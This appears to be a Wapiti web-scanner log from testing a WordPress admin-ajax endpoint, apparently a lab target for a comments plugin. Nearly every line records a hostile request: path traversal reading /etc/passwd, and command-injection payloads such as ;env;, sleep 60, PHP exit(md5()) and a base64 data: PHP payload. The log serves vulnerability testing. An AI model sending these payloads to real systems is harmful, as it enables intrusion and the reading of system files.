2024-03-21 21:16:59.918 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:17:00.575 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:17:01.231 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:17:01.883 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:17:02.528 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:17:03.137 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:17:03.797 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:17:04.457 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:17:05.115 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:17:05.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:17:06.437 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:17:07.092 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:17:07.751 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:17:08.412 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-21 21:17:09.063 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 21:17:09.719 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-21 21:17:10.341 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:17:10.991 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-21 21:17:11.630 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-21 21:17:12.291 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:17:12.948 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:17:13.607 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=admin-ajax.php (0)
2024-03-21 21:17:14.263 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=admin-ajax.php%00 (0)
2024-03-21 21:17:14.874 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=admin-ajax.php%3A%3A%24DATA (0)
2024-03-21 21:17:15.518 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 21:17:15.536 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:17:16.182 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 21:17:16.182 | GREEN    | wapitiCore.attack.mod_http_headers:check_header:103 - OK
2024-03-21 21:17:16.182 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 21:17:16.182 | GREEN    | wapitiCore.attack.mod_http_headers:check_header:103 - OK
2024-03-21 21:17:16.209 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-21 21:17:16.225 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:17:16.228 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%3Benv%3B&action=sac_post_type_call (0)
2024-03-21 21:17:16.840 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%7Cenv%7C&action=sac_post_type_call (0)
2024-03-21 21:17:17.452 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=a%3Benv%3B&action=sac_post_type_call (0)
2024-03-21 21:17:18.064 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=a%3Benv%3B&action=sac_post_type_call (0)
2024-03-21 21:17:18.676 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&action=sac_post_type_call (0)
2024-03-21 21:17:19.287 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%3Benv%3B&action=sac_post_type_call (0)
2024-03-21 21:17:19.899 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%0Aenv%3B&action=sac_post_type_call (0)
2024-03-21 21:17:20.510 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%26set%26&action=sac_post_type_call (0)
2024-03-21 21:17:21.121 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=set&action=sac_post_type_call (0)
2024-03-21 21:17:21.733 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=env&action=sac_post_type_call (0)
2024-03-21 21:17:22.353 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%2Fe%00&action=sac_post_type_call (0)
2024-03-21 21:17:22.966 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=sac_post_type_call (0)
2024-03-21 21:17:23.578 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=sac_post_type_call (0)
2024-03-21 21:17:24.190 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=sac_post_type_call (0)
2024-03-21 21:17:24.803 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=sac_post_type_call (0)
2024-03-21 21:17:25.415 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=sac_post_type_call (0)
2024-03-21 21:17:26.026 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=sac_post_type_call (0)
2024-03-21 21:17:26.637 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=sac_post_type_call (0)
2024-03-21 21:17:27.250 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=sac_post_type_call (0)
2024-03-21 21:17:27.872 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=sac_post_type_call (0)
2024-03-21 21:17:28.488 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=sac_post_type_call (0)
2024-03-21 21:17:29.100 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=sac_post_type_call (0)
2024-03-21 21:17:29.712 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=sac_post_type_call (0)
2024-03-21 21:17:30.326 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&action=sac_post_type_call (0)
2024-03-21 21:17:30.937 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=a%60%29%60&action=sac_post_type_call (0)
2024-03-21 21:17:31.549 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=a%60sleep%2060%60&action=sac_post_type_call (0)
2024-03-21 21:17:32.161 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=a%3Bsleep%2060%3B&action=sac_post_type_call (0)
2024-03-21 21:17:32.773 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=a%7Csleep%2060%3B&action=sac_post_type_call (0)
2024-03-21 21:17:33.394 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=%26ping%20-n%2025%20127.0.0.1%26&action=sac_post_type_call (0)
2024-03-21 21:17:34.013 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%3Benv%3B (0)
2024-03-21 21:17:34.620 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%7Cenv%7C (0)
2024-03-21 21:17:35.230 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=a%3Benv%3B (0)
2024-03-21 21:17:35.889 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=a%3Benv%3B (0)
2024-03-21 21:17:36.546 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-21 21:17:37.156 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%3Benv%3B (0)
2024-03-21 21:17:37.807 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%0Aenv%3B (0)
2024-03-21 21:17:38.467 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%26set%26 (0)
2024-03-21 21:17:39.126 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=set (0)
2024-03-21 21:17:39.786 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=env (0)
2024-03-21 21:17:40.445 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%2Fe%00 (0)
2024-03-21 21:17:41.099 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:17:41.752 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:17:42.415 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:17:43.073 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:17:43.732 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:17:44.388 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:17:45.042 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:17:45.697 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:17:46.356 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:17:47.014 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:17:47.625 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 21:17:48.234 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-21 21:17:48.891 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-21 21:17:49.545 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=a%60%29%60 (0)
2024-03-21 21:17:50.194 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=a%60sleep%2060%60 (0)
2024-03-21 21:17:50.847 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=a%3Bsleep%2060%3B (0)
2024-03-21 21:17:51.453 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=a%7Csleep%2060%3B (0)
2024-03-21 21:17:52.067 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-21 21:17:52.753 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-21 21:17:52.769 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:17:53.429 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-21 21:17:53.518 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-21 21:17:53.537 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call (0)
2024-03-21 21:17:54.210 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-21 21:17:54.267 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//show-all-comments-in-one-page.json/
2024-03-21 21:17:54.267 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//show-all-comments-in-one-page.json/web_03212024_2115.html with a browser to see this report.
